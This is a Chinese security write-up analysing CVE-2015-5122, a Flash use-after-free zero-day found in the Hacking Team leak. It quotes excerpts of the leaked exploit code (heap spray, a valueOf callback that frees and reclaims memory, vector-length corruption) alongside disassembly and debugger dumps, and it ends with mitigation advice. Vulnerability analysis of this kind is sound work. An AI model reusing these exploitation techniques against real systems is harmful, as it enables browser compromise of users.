# 原文地址:<http://drops.wooyun.org/papers/7049>

# 0x00 前言

* * *

前几天我们分析了Hacking Team泄露数据中的3个exploit，包括一个flash 0day，一个flash
nday和一个windows字体提权0day。昨天Adobe在发布了最新的flash版本（18.0.0.203），修补了其中的flash
0day（CVE-2015-5119）。然而今天twitter上面又有研究者爆猛料，称Hacking Team泄露数据中还有一个未修补的flash
0day，在最新的flash版本中仍然可以触发。Adobe随后也发布了对应的安全公告APSA15-04，漏洞的CVE编号为：CVE-2015-5122。影响Windows、MacOSX和Linux平台上的IE、Chrome浏览器等主流浏览器。

![enter image description
here](http://static.wooyun.org//drops/20150711/2015071110191992383.jpg)

我们经过分析，确认这确实又是一个新的flash
0day，漏洞成因是DisplayObject在设置opaqueBackground属性时，没有正确处理可能发生的回调（又是valueOf，是在下输了），而产生的Use
After Free漏洞。本文将分析这个漏洞的成因和利用方式。

# 0x01 漏洞原理分析

* * *

出问题的函数是DisplayObject对象的opaqueBackground属性设置函数：

我们来看一下HackingTeam泄露的exploit代码，关键部分如下：

    
    
    #!c++
    1   for(i=_arLen1; i < _arLen2; i++)
    2       _ar[i] = _tb.createTextLine(); // fill 1016-byte holes (0x38c is a size of internal TextLine object)
    3       for(i=_arLen1; i < _arLen2; i++)
    4           _ar[i].opaqueBackground = 1; // alloc 1016 bytes
    

在这个过程中会每个TextLine Object内部会分配0x390大小的对象，对象分配的代码在：

    
    
    1   .text:1025DC71                 push    1
    2   .text:1025DC73                 push    eax
    3   .text:1025DC74                 push    390h
    4   .text:1025DC79                 call    operator_new2
    

调试过程中分配的0x390内部对象地址：

    
    
    Allocate 0x390 object:04cbc810
    Allocate 0x390 object:0513c810
    Allocate 0x390 object:0513cc08
    Allocate 0x390 object:05d94020
    Allocate 0x390 object:05d94418
    Allocate 0x390 object:05d94810
    Allocate 0x390 object:05d94c08
    Allocate 0x390 object:05d95020
    Allocate 0x390 object:05d95418
    Allocate 0x390 object:05d95810
    Allocate 0x390 object:05d95c08
    Allocate 0x390 object:05d96020
    Allocate 0x390 object:05d96418
    Allocate 0x390 object:05d96810
    Allocate 0x390 object:05d96c08
    Allocate 0x390 object:05d97020
    Allocate 0x390 object:05d97418
    

2 设置opaqueBackground，触发valueOf函数调用：

    
    
    1   MyClass.prototype.valueOf = valueOf2;
    2                    
    3   // here we go, call the vulnerable setter
    4   _cnt = _arLen2-6;
    5   _ar[_cnt].opaqueBackground = _mc;
    

和之前两个漏洞一样，exploit定义了自己的类，设置valueOf函数，然后在opaqueBackground的设置函数中，我们可以看到有一个将传入的参数转换为integer的过程，这个调用触发了MyClass的valueOf函数：

    
    
    .text:1025DD4C loc_1025DD4C: CODE XREF: set_opaqueBackground+2Fj
    .text:1025DD4C                 push    ebx
    .text:1025DD4D                 push    [esp+10h+param]
    .text:1025DD51                 call    [[email protected]](/cdn-cgi/l/email-protection)@avmplus@@[[email protected]](/cdn-cgi/l/email-protection) ; avmplus::AvmCore::integer(int)
    

3 在valueOf函数中，释放TextLine Object，并使用vector占位

    
    
    #!c++
    01  static function valueOf2()
    02  {
    03      try
    04      {  
    05          if (++_cnt < _arLen2) {
    06              // recursive call for next TextLine
    07              _ar[_cnt].opaqueBackground = _mc;
    08          }else{
    09              Log("MyClass.valueOf2()");
    10               
    11              // free internal objects
    12              for(var i:int=1; i <= 5; i++)
    13                  _tb.recreateTextLine(_ar[_arLen2-i]);
    14               
    15              // reuse freed memory
    16              for(i=_arLen2; i < _arLen; i++)
    17                  _ar[i].length = _vLen;
    18          }
    19      }
    20      catch (e:Error)
    21      {
    22          Log("valueOf2 " + e.toString());
    23      }
    24      return _vLen+8;
    25  }
    

我们可以看到valueOf函数通过调用recreateTextLine释放了原来的TextLine对象（因此0x390大小的内部对象也将被释放）。然后使用0x190大小的vector对象试图占用已经释放的0x390大小对象的内存。这里之所以选用0x190大小的vector，是因为之后代码会对已经释放的0x390内部对象进行一个写操作，这个写操作的偏移是0x320，正好是0x190的两倍，这样写的时候可以直接写到vector的长度字段。这里用了一个技巧：用不同大小的对象去占位时，必须以页为单位释放原对象的内存，才有可能成功（也就是说这里必须连续释放多个0x390大小的内部对象，造成至少一个page（0x1000）内存被释放，然后才能用0x190的vector去占它）。

4 从valueOf返回，已经释放的0x390内部对象被写入

    
    
    #!bash
    eax=00000000 ebx=0000006a ecx=05d92708 edx=00000006 esi=05d97020 edi=0515dd78
    eip=631bdd7e esp=0300bfec ebp=05d92708 iopl=0 nv up ei pl zr na pe nc
    cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246
    Flash32_18_0_0_203!DllUnregisterServer+0x7489c:
    631bdd7e 889e20030000 mov byte ptr [esi+320h],bl ds:0023:05d97340=62
    0:006> dd esi
    05d97020 00000062
    04cb3000 00000037 00000000
    

Esi指向已经被释放的0x390大小对象（0x5d97020），可以参考前面分配时记录的对象地址，很容易看出这是其中一个0x390对象。写入的是esi+0x320处，可以看到已经被vector占用，并且指向某个vector的长度字段（0x62）。
写操作完成后，vector长度被篡改为0x6a:

    
    
    0:006> p
    0:006> dd esi+320 L4
    05d97340  0000006a 04cb3000 00000039 00000000
    

之后exploit再利用这个稍微变长了一点点的vector，修改紧邻的下一个vector的长度为0x40000000：

    
    
    0:006> dd 5D974D0L4
    05d974d0  40000000 04fc3000 0000003a 00000000
    

# 0x02 漏洞防范

* * *

由于该漏洞利用非常稳定，而Adobe暂时没有发布该漏洞的补丁，我们建议补丁发布之前，可以暂时先禁用flash插件。

